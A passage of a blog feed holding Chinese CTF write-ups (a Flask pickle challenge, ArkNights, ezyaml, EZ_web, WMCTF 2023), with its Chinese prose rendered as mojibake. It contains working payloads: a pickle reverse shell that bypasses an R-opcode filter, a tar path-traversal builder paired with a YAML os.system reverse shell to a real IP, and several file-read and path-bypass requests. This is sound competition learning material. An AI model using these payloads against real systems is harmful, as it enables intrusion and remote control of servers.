<span class="keyword">not</span> <span class="built_in">isinstance</span>(attribute, <span class="built_in">dict</span>):</span><br><span class="line">            <span class="keyword">raise</span> Exception</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Hacker!!!&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> attribute.get(<span class="string">&#x27;name&#x27;</span>) == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> attribute.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> secret</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Don&#x27;t play tricks on me&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;You are a perfect stranger to me&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>éœ€è¦å…ˆæˆä¸ºadminï¼Œä½†æ˜¯æ²¡ç»™secret keyï¼Œè§£å¯†flask-sessionï¼Œé‡Œé¢å°±æœ‰secret keyï¼š<code>GWHThYEbNgx01r</code></p><p>ä¼ªé€ ä¸Šå»åæç¤º<code>/src0de</code>å’Œ<code>/ppppppppppick1e</code></p><p>åœ¨<code>/src0de</code>æ‹¿åˆ°éƒ¨åˆ†æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/src0de&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">src0de</span>():</span><br><span class="line">    f = <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    rsp = f.read()</span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">return</span> rsp[rsp.index(<span class="string">&quot;@app.route(&#x27;/src0de&#x27;)&quot;</span>):]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ppppppppppick1e&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ppppppppppick1e</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">        rsp = make_response(<span class="string">&quot;Hello, %s &quot;</span> % username)</span><br><span class="line">        rsp.headers[<span class="string">&#x27;hint&#x27;</span>] = <span class="string">&quot;Source in /src0de&quot;</span></span><br><span class="line">        pick1e = request.cookies.get(<span class="string">&#x27;pick1e&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> pick1e <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            pick1e = base64.b64decode(pick1e)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> rsp</span><br><span class="line">        <span class="keyword">if</span> check(pick1e):</span><br><span class="line">            pick1e = pickle.loads(pick1e)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Go for it!!!&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No Way!!!&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        error_message = <span class="built_in">str</span>(e)</span><br><span class="line">        <span class="keyword">return</span> error_message</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rsp</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GWHT</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>pickleååºåˆ—åŒ–ï¼Œæœ‰ä¸ªcheckå‡½æ•°ï¼Œæµ‹è¯•å‘ç°è¿‡æ»¤RæŒ‡ä»¤</p><p>bæŒ‡ä»¤ç»•RæŒ‡ä»¤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,age</span>):</span><br><span class="line">        self.age=age</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp=<span class="string">b&#x27;&#x27;&#x27;(c__main__</span></span><br><span class="line"><span class="string">Person</span></span><br><span class="line"><span class="string">I18</span></span><br><span class="line"><span class="string">o&#125;(S&quot;__setstate__&quot;</span></span><br><span class="line"><span class="string">cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">ubS&quot;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/2333 0&gt;&amp;1\&quot;&quot;</span></span><br><span class="line"><span class="string">b.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(exp))</span><br></pre></td></tr></table></figure><p>æ²¡æƒé™è¯»flagï¼Œéœ€è¦ææƒ</p><p>ç”¨python3.8ä½œsuidææƒå³å¯</p><h2 id="ArkNights"><a href="#ArkNights" class="headerlink" title="ArkNights"></a>ArkNights</h2><p><code>/read</code>ç›´æ¥è¯»ç¯å¢ƒå˜é‡,flagå°±åœ¨é‡Œé¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/read?file=/proc/1/environ</span><br></pre></td></tr></table></figure><p>æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> *</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] =<span class="built_in">str</span>(uuid.uuid4()).replace(<span class="string">&quot;-&quot;</span>,<span class="string">&quot;*&quot;</span>)+<span class="string">&quot;Boogipopisweak&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name=request.args.get(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;name&quot;</span>)</span><br><span class="line">    m1sery=[request.args.get(<span class="string">&quot;m1sery&quot;</span>,<span class="string">&quot;Doctor.Boogipop&quot;</span>)]</span><br><span class="line">    <span class="keyword">if</span>(session.get(<span class="string">&quot;name&quot;</span>)==<span class="string">&quot;Dr.Boog1pop&quot;</span>):</span><br><span class="line">        blacklist=re.findall(<span class="string">&quot;/ba|sh|\\\\|\[|]|#|system|&#x27;|\&quot;/&quot;</span>, name, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;bad hacker no way&quot;</span></span><br><span class="line">        <span class="built_in">exec</span>(<span class="string">f&#x27;for [<span class="subst">&#123;name&#125;</span>] in [<span class="subst">&#123;m1sery&#125;</span>]:print(&quot;strange?&quot;)&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        session[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&quot;Doctor&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,name=session.get(<span class="string">&quot;name&quot;</span>))</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">        file = request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">        fileblacklist=re.findall(<span class="string">&quot;/flag|fl|ag/&quot;</span>,file, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> fileblacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;bad hacker!&quot;</span></span><br><span class="line">        start=request.args.get(<span class="string">&quot;start&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">        end=request.args.get(<span class="string">&quot;end&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> start==<span class="string">&quot;0&quot;</span> <span class="keyword">and</span> end==<span class="string">&quot;0&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">open</span>(file,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            start,end=<span class="built_in">int</span>(start),<span class="built_in">int</span>(end)</span><br><span class="line">            f=<span class="built_in">open</span>(file,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">            f.seek(start)</span><br><span class="line">            data=f.read(end)</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:path&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_page</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="built_in">print</span>(os.path.pardir)</span><br><span class="line">    <span class="built_in">print</span>(path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;templates/&quot;</span> + path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;not found&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> render_template(path)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">False</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ezyaml"><a href="#ezyaml" class="headerlink" title="ezyaml"></a>ezyaml</h2><p>æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    blacklist = [</span><br><span class="line">        <span class="string">&quot;bytes&quot;</span>,</span><br><span class="line">        <span class="string">&quot;eval&quot;</span>,</span><br><span class="line">        <span class="string">&quot;map&quot;</span>,</span><br><span class="line">        <span class="string">&quot;frozenset&quot;</span>,</span><br><span class="line">        <span class="string">&quot;popen&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tuple&quot;</span>,</span><br><span class="line">        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">        <span class="string">&quot;\\&quot;</span>,</span><br><span class="line">        <span class="string">&quot;object&quot;</span>,</span><br><span class="line">        <span class="string">&quot;listitems&quot;</span>,</span><br><span class="line">        <span class="string">&quot;subprocess&quot;</span>,</span><br><span class="line">        <span class="string">&quot;object&quot;</span>,</span><br><span class="line">        <span class="string">&quot;apply&quot;</span>,</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> <span class="built_in">str</span>(s).lower():</span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(no)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extractFile</span>(<span class="params">filepath, <span class="built_in">type</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;è§£å‹taræ–‡ä»¶&#x27;&#x27;&#x27;</span></span><br><span class="line">    extractdir = filepath.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(extractdir):</span><br><span class="line">        os.makedirs(extractdir)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&quot;tar&quot;</span>:</span><br><span class="line">        tf = tarfile.TarFile(filepath)</span><br><span class="line">        tf.extractall(extractdir)</span><br><span class="line">        <span class="keyword">return</span> tf.getnames()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    fn = <span class="string">&quot;uploads/&quot;</span> + md5().hexdigest()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(fn):</span><br><span class="line">        os.makedirs(fn)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/upload&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        upFile = request.files[<span class="string">&quot;file&quot;</span>]</span><br><span class="line">        <span class="built_in">print</span>(upFile)</span><br><span class="line">        <span class="keyword">if</span> re.search(<span class="string">r&quot;\.\.|/&quot;</span>, upFile.filename, re.M | re.I) != <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Hacker!&#x27;);window.location.href=&#x27;/upload&#x27;&lt;/script&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">        savePath = <span class="string">f&quot;uploads/<span class="subst">&#123;upFile.filename&#125;</span>&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(savePath)</span><br><span class="line">        upFile.save(savePath)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> tarfile.is_tarfile(savePath):</span><br><span class="line">            zipDatas = extractFile(savePath, <span class="string">&quot;tar&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(zipDatas)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;result.html&quot;</span>,</span><br><span class="line">                                   path=savePath,</span><br><span class="line">                                   files=zipDatas)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;&lt;script&gt;alert(&#x27;<span class="subst">&#123;upFile.filename&#125;</span> upload successfully&#x27;);history.back(-1);&lt;/script&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">src</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args:</span><br><span class="line">        username = request.args.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;config/<span class="subst">&#123;username&#125;</span>.yaml&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            Config = yaml.load(f.read())</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;admin.html&quot;</span>,</span><br><span class="line">                                   username=<span class="string">&quot;admin&quot;</span>,</span><br><span class="line">                                   message=<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>æ€è·¯å¾ˆæ˜äº†,<code>/upload</code>ä¸Šä¼ <code>xx.tar</code>ï¼Œç„¶åè§£å‹æ–‡ä»¶åˆ°<code>/config/&#123;username&#125;.yaml</code>ï¼Œåœ¨<code>/src</code>åˆ©ç”¨ä¸Šä¼ çš„<code>xx.yaml</code>è¿›è¡Œyamlååºåˆ—åŒ–</p><p>ä½†æ˜¯å‘ç°ä¸Šä¼ çš„æ–‡ä»¶é»˜è®¤ä¿å­˜ç›®å½•æ˜¯åœ¨<code>uploads/&#123;upFile.filename&#125;</code>,è§£å‹å‡½æ•°ä¸º<code>tarfile</code>,å­˜åœ¨<code>CVE-2007-4559</code></p><p>ç”Ÿæˆæ¶æ„taråŒ…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">tarinfo</span>):</span><br><span class="line">    tarinfo.name = <span class="string">&quot;../../config/&quot;</span> + tarinfo.name</span><br><span class="line">    <span class="keyword">return</span> tarinfo</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> tarfile.<span class="built_in">open</span>(<span class="string">&quot;exploit.tar&quot;</span>, <span class="string">&quot;w:tar&quot;</span>) <span class="keyword">as</span> tar:</span><br><span class="line">    tar.add(<span class="string">&quot;exploit.yaml&quot;</span>, <span class="built_in">filter</span>=change_name)</span><br></pre></td></tr></table></figure><p><strong>exploit.yaml</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!python/object/new:os.system</span> [<span class="string">&quot;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/115.236.153.174/47295 0&gt;&amp;1\&quot;&quot;</span>] </span><br></pre></td></tr></table></figure><p>ä¸Šä¼ æˆåŠŸå<code>/src</code>è§¦å‘åå¼¹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/src?username=exploit</span><br></pre></td></tr></table></figure><h2 id="EZ-web"><a href="#EZ-web" class="headerlink" title="EZ_web"></a>EZ_web</h2><p>ä¸‰ä¸ªåŠŸèƒ½ï¼Œä¸Šä¼ æ–‡ä»¶ã€æ‰§è¡Œå‘½ä»¤ã€åˆ—å‡ºç›®å½•</p><p>flagå°±åœ¨<code>/flag.txt</code>é‡Œ</p><p><code>/etc/ld.so.preload</code>é…ç½®æ–‡ä»¶ åŠ«æŒ</p>]]></content>
      
      
      <categories>
          
          <category> competition </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pikle </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WMCTF 2023</title>
      <link href="/2023/08/22/wmctf/"/>
      <url>/2023/08/22/wmctf/</url>
      
        <content type="html"><![CDATA[<h1 id="WMCTF-2023"><a href="#WMCTF-2023" class="headerlink" title="WMCTF 2023"></a>WMCTF 2023</h1><h2 id="AnyFileRead"><a href="#AnyFileRead" class="headerlink" title="AnyFileRead"></a>AnyFileRead</h2><p><code>/path</code>å¯è¯»ä»»æ„æ–‡ä»¶ï¼Œä¸”æ²¡æœ‰é™åˆ¶</p><p><a href="https://imgse.com/i/pPJmzHH"><img src="https://s1.ax1x.com/2023/08/22/pPJmzHH.png" alt="pPJmzHH.png"></a></p><p>SpringScurityçš„ç®€å•ç»•è¿‡ï¼Œæ³¨æ„ç¼–ç é—®é¢˜</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin/../flag</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pPJnpEd"><img src="https://s1.ax1x.com/2023/08/22/pPJnpEd.png" alt="pPJnpEd.png"></a></p><h2 id="ez-java-agagin"><a href="#ez-java-agagin" class="headerlink" title="ez_java_agagin"></a>ez_java_agagin</h2><p>æºç é‡Œæœ‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--  &lt;link rel=&quot;Shortcut Icon&quot; href=&quot;./Imagefile?url1=upload/favicon.ico&quot; type=&quot;image/x-icon&quot; /&gt; å­˜åœ¨å®‰å…¨é—®é¢˜ï¼Œå·²åºŸå¼ƒ--&gt;</span><br></pre></td></tr></table></figure><p>æç¤º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">must contain java and not have flag</span><br></pre></td></tr></table></figure><p><code>/usr/share/java/</code>åŒ…å«javaå­—æ ·ï¼Œfileåè®®è¯»flagï¼Œflagéœ€è¦äºŒæ¬¡ç¼–ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Imagefile?url1=file:///usr/share/java/../../../../%2566%256c%2561%2567</span><br></pre></td></tr></table></figure><h2 id="ezblog"><a href="#ezblog" class="headerlink" title="ezblog"></a>ezblog</h2><p>ç”¨jså®ç°äº†ç±»ä¼¼python debug pinç åŠŸèƒ½</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/console&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&quot;console&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// åŸºäºTokençš„Sessioné‰´æƒæœºåˆ¶çš„ç¼–å†™</span></span><br><span class="line"><span class="keyword">let</span> token = (<span class="number">0</span>, uuid_1.<span class="property">v4</span>)();</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">requireAuth</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">headers</span> &amp;&amp; req.<span class="property">headers</span>.<span class="property">authorization</span> &amp;&amp; req.<span class="property">headers</span>.<span class="property">authorization</span> === token) &#123;</span><br><span class="line">        <span class="title function_">next</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">send</span>(&#123;</span><br><span class="line">            <span class="attr">code</span>: <span class="number">401</span>,</span><br><span class="line">            <span class="attr">message</span>: <span class="string">&quot;Unauthorized&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: <span class="string">&quot;Error: Unauthorized&quot;</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// debugger</span></span><br><span class="line"><span class="comment">// ä»¿ç…§ werkzeug å®ç°çš„è°ƒè¯•å™¨é‰´æƒ</span></span><br><span class="line"><span class="comment">// pin 